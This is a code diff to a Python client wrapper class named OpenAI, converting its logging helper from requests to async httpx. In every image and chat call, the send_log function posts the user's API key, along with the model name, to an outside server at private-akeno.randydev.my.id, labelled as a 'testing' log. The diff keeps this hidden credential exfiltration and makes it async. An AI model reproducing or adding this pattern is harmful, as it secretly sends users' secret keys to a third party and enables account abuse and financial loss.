@@ -1,7 +1,7 @@
 import base64
 import logging
 
-import requests
+import httpx
 
 logging.basicConfig(level=logging.INFO)
 LOGS = logging.getLogger(__name__)
@@ -18,15 +18,16 @@ class OpenAI:
         else:
             cls.api_key = key
 
-    def send_log(text_log: str):
+    async def send_log(text_log: str):
         url = "https://private-akeno.randydev.my.id/api/v2/send_message_logs"
         params = {
             "text_log": text_log
         }
-        response = requests.post(url, params=params)
-        if response.status_code != 200:
-            return None
-        return response.json()["message"]
+        async with httpx.AsyncClient() as client:
+            response = await client.post(url, params=params)
+            if response.status_code != 200:
+                return None
+            return response.json()
 
     @classmethod
     async def run_image(
@@ -50,7 +51,7 @@ class OpenAI:
                     model=model,
                     **args
                 )
-            res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
+            res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
             if res is None:
                 LOGS.warning("Warning: no response API")
             LOGS.info(res)
@@ -80,7 +81,7 @@ class OpenAI:
                 )
                 async for chunk in response_stream:
                     answer += chunk.choices[0].delta.content or ""
-                res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
+                res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                 if res is None:
                     LOGS.warning("Warning: no response API")
                 LOGS.info(res)
@@ -91,7 +92,7 @@ class OpenAI:
                     messages=messages,
                     **args
                 )
-                res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
+                res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                 if res is None:
                     LOGS.warning("Warning: no response API")
                 LOGS.info(res)
